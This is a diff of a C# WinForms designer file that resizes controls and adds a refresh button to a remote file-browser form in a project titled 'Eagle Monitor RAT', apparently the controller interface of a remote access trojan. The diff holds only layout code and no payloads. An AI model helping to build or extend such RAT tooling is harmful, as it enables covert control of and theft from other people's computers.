@@ -51,6 +51,7 @@
             this.diskComboBox = new Guna.UI2.WinForms.Guna2ComboBox();
             this.labelPath = new System.Windows.Forms.Label();
             this.panel1 = new System.Windows.Forms.Panel();
+            this.refreshGuna2CirclePictureBox = new Guna.UI2.WinForms.Guna2CirclePictureBox();
             this.panel2 = new System.Windows.Forms.Panel();
             this.closeButton = new Guna.UI2.WinForms.Guna2Button();
             this.maximizeButton = new Guna.UI2.WinForms.Guna2Button();
@@ -61,6 +62,7 @@
             this.filesContextMenuStrip.SuspendLayout();
             this.folderShortCutContextMenuStrip.SuspendLayout();
             this.panel1.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.refreshGuna2CirclePictureBox)).BeginInit();
             this.SuspendLayout();
             // 
             // fileListView
@@ -74,10 +76,10 @@
             this.fileListView.Dock = System.Windows.Forms.DockStyle.Fill;
             this.fileListView.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.fileListView.HideSelection = false;
-            this.fileListView.Location = new System.Drawing.Point(3, 83);
+            this.fileListView.Location = new System.Drawing.Point(3, 78);
             this.fileListView.Margin = new System.Windows.Forms.Padding(8);
             this.fileListView.Name = "fileListView";
-            this.fileListView.Size = new System.Drawing.Size(1020, 315);
+            this.fileListView.Size = new System.Drawing.Size(678, 326);
             this.fileListView.TabIndex = 27;
             this.fileListView.UseCompatibleStateImageBehavior = false;
             this.fileListView.View = System.Windows.Forms.View.Tile;
@@ -86,14 +88,14 @@
             // fileContextMenuStrip
             // 
             this.fileContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 8.25F);
-            this.fileContextMenuStrip.ImageScalingSize = new System.Drawing.Size(28, 28);
+            this.fileContextMenuStrip.ImageScalingSize = new System.Drawing.Size(32, 32);
             this.fileContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.goToolStripMenuItem,
             this.backToolStripMenuItem,
             this.filesToolStripMenuItem,
             this.shortCutsToolStripMenuItem});
             this.fileContextMenuStrip.Name = "fileContextMenuStrip";
-            this.fileContextMenuStrip.Size = new System.Drawing.Size(138, 140);
+            this.fileContextMenuStrip.Size = new System.Drawing.Size(142, 156);
             // 
             // goToolStripMenuItem
             // 
@@ -101,7 +103,7 @@
             this.goToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.goToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.button_arrow_right_2x;
             this.goToolStripMenuItem.Name = "goToolStripMenuItem";
-            this.goToolStripMenuItem.Size = new System.Drawing.Size(137, 34);
+            this.goToolStripMenuItem.Size = new System.Drawing.Size(141, 38);
             this.goToolStripMenuItem.Text = "Go";
             this.goToolStripMenuItem.Click += new System.EventHandler(this.goToolStripMenuItem_Click);
             // 
@@ -111,7 +113,7 @@
             this.backToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.backToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.button_arrow_left_2x;
             this.backToolStripMenuItem.Name = "backToolStripMenuItem";
-            this.backToolStripMenuItem.Size = new System.Drawing.Size(137, 34);
+            this.backToolStripMenuItem.Size = new System.Drawing.Size(141, 38);
             this.backToolStripMenuItem.Text = "Back";
             this.backToolStripMenuItem.Click += new System.EventHandler(this.backToolStripMenuItem_Click);
             // 
@@ -122,7 +124,7 @@
             this.filesToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.filesToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.file_list_2x;
             this.filesToolStripMenuItem.Name = "filesToolStripMenuItem";
-            this.filesToolStripMenuItem.Size = new System.Drawing.Size(137, 34);
+            this.filesToolStripMenuItem.Size = new System.Drawing.Size(141, 38);
             this.filesToolStripMenuItem.Text = "Files";
             // 
             // filesContextMenuStrip
@@ -196,7 +198,7 @@
             this.shortCutsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
             this.shortCutsToolStripMenuItem.Image = global::EagleMonitor.Properties.Resources.pin_blue_2x;
             this.shortCutsToolStripMenuItem.Name = "shortCutsToolStripMenuItem";
-            this.shortCutsToolStripMenuItem.Size = new System.Drawing.Size(137, 34);
+            this.shortCutsToolStripMenuItem.Size = new System.Drawing.Size(141, 38);
             this.shortCutsToolStripMenuItem.Text = "ShortCuts";
             // 
             // folderShortCutContextMenuStrip
@@ -268,10 +270,10 @@
             this.diskComboBox.HoverState.Parent = this.diskComboBox;
             this.diskComboBox.ItemHeight = 30;
             this.diskComboBox.ItemsAppearance.Parent = this.diskComboBox;
-            this.diskComboBox.Location = new System.Drawing.Point(2, 4);
+            this.diskComboBox.Location = new System.Drawing.Point(3, 3);
             this.diskComboBox.Name = "diskComboBox";
             this.diskComboBox.ShadowDecoration.Parent = this.diskComboBox;
-            this.diskComboBox.Size = new System.Drawing.Size(281, 36);
+            this.diskComboBox.Size = new System.Drawing.Size(175, 36);
             this.diskComboBox.TabIndex = 26;
             this.diskComboBox.SelectedIndexChanged += new System.EventHandler(this.diskComboBox_SelectedIndexChanged);
             // 
@@ -279,7 +281,7 @@
             // 
             this.labelPath.AutoSize = true;
             this.labelPath.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
-            this.labelPath.Location = new System.Drawing.Point(289, 18);
+            this.labelPath.Location = new System.Drawing.Point(184, 15);
             this.labelPath.Name = "labelPath";
             this.labelPath.Size = new System.Drawing.Size(55, 13);
             this.labelPath.TabIndex = 28;
@@ -287,23 +289,42 @@
             // 
             // panel1
             // 
+            this.panel1.Controls.Add(this.refreshGuna2CirclePictureBox);
             this.panel1.Controls.Add(this.panel2);
             this.panel1.Controls.Add(this.labelPath);
             this.panel1.Controls.Add(this.diskComboBox);
             this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
             this.panel1.Location = new System.Drawing.Point(3, 32);
             this.panel1.Name = "panel1";
-            this.panel1.Size = new System.Drawing.Size(1020, 51);
+            this.panel1.Size = new System.Drawing.Size(678, 46);
             this.panel1.TabIndex = 30;
+            // 
+            // refreshGuna2CirclePictureBox
+            // 
+            this.refreshGuna2CirclePictureBox.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
+            this.refreshGuna2CirclePictureBox.Image = global::EagleMonitor.Properties.Resources.action_repeat;
+            this.refreshGuna2CirclePictureBox.Location = new System.Drawing.Point(646, 0);
+            this.refreshGuna2CirclePictureBox.Name = "refreshGuna2CirclePictureBox";
+            this.refreshGuna2CirclePictureBox.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
+            this.refreshGuna2CirclePictureBox.ShadowDecoration.Parent = this.refreshGuna2CirclePictureBox;
+            this.refreshGuna2CirclePictureBox.Size = new System.Drawing.Size(32, 41);
+            this.refreshGuna2CirclePictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
+            this.refreshGuna2CirclePictureBox.TabIndex = 37;
+            this.refreshGuna2CirclePictureBox.TabStop = false;
+            this.refreshGuna2CirclePictureBox.Click += new System.EventHandler(this.refreshGuna2CirclePictureBox_Click);
+            this.refreshGuna2CirclePictureBox.MouseDown += new System.Windows.Forms.MouseEventHandler(this.refreshGuna2CirclePictureBox_MouseDown);
+            this.refreshGuna2CirclePictureBox.MouseLeave += new System.EventHandler(this.refreshGuna2CirclePictureBox_MouseLeave);
+            this.refreshGuna2CirclePictureBox.MouseHover += new System.EventHandler(this.refreshGuna2CirclePictureBox_MouseHover);
+            this.refreshGuna2CirclePictureBox.MouseUp += new System.Windows.Forms.MouseEventHandler(this.refreshGuna2CirclePictureBox_MouseUp);
             // 
             // panel2
             // 
             this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
             this.panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
             this.panel2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
-            this.panel2.Location = new System.Drawing.Point(0, 46);
+            this.panel2.Location = new System.Drawing.Point(0, 41);
             this.panel2.Name = "panel2";
-            this.panel2.Size = new System.Drawing.Size(1020, 5);
+            this.panel2.Size = new System.Drawing.Size(678, 5);
             this.panel2.TabIndex = 29;
             // 
             // closeButton
@@ -315,7 +336,7 @@
             this.closeButton.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.closeButton.ForeColor = System.Drawing.Color.White;
             this.closeButton.HoverState.Parent = this.closeButton;
-            this.closeButton.Location = new System.Drawing.Point(991, 0);
+            this.closeButton.Location = new System.Drawing.Point(649, 0);
             this.closeButton.Name = "closeButton";
             this.closeButton.ShadowDecoration.Enabled = true;
             this.closeButton.ShadowDecoration.Parent = this.closeButton;
@@ -333,7 +354,7 @@
             this.maximizeButton.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.maximizeButton.ForeColor = System.Drawing.Color.White;
             this.maximizeButton.HoverState.Parent = this.maximizeButton;
-            this.maximizeButton.Location = new System.Drawing.Point(953, 0);
+            this.maximizeButton.Location = new System.Drawing.Point(611, 0);
             this.maximizeButton.Name = "maximizeButton";
             this.maximizeButton.ShadowDecoration.Enabled = true;
             this.maximizeButton.ShadowDecoration.Parent = this.maximizeButton;
@@ -351,7 +372,7 @@
             this.minimizeButton.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.minimizeButton.ForeColor = System.Drawing.Color.White;
             this.minimizeButton.HoverState.Parent = this.minimizeButton;
-            this.minimizeButton.Location = new System.Drawing.Point(915, 0);
+            this.minimizeButton.Location = new System.Drawing.Point(573, 0);
             this.minimizeButton.Name = "minimizeButton";
             this.minimizeButton.ShadowDecoration.Enabled = true;
             this.minimizeButton.ShadowDecoration.Parent = this.minimizeButton;
@@ -385,7 +406,7 @@
             this.label1.ForeColor = System.Drawing.Color.White;
             this.label1.Location = new System.Drawing.Point(41, 0);
             this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(868, 32);
+            this.label1.Size = new System.Drawing.Size(526, 32);
             this.label1.TabIndex = 36;
             this.label1.Text = "Eagle Monitor RAT";
             this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
@@ -396,7 +417,7 @@
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
-            this.ClientSize = new System.Drawing.Size(1026, 401);
+            this.ClientSize = new System.Drawing.Size(684, 407);
             this.Controls.Add(this.label1);
             this.Controls.Add(this.loadingCircle1);
             this.Controls.Add(this.closeButton);
@@ -417,6 +438,7 @@
             this.folderShortCutContextMenuStrip.ResumeLayout(false);
             this.panel1.ResumeLayout(false);
             this.panel1.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.refreshGuna2CirclePictureBox)).EndInit();
             this.ResumeLayout(false);
 
         }
@@ -450,5 +472,6 @@
         private System.Windows.Forms.ToolStripMenuItem userProfileToolStripMenuItem;
         public System.Windows.Forms.Label label1;
         private System.Windows.Forms.ToolStripMenuItem uploadToolStripMenuItem;
+        private Guna.UI2.WinForms.Guna2CirclePictureBox refreshGuna2CirclePictureBox;
     }
 }
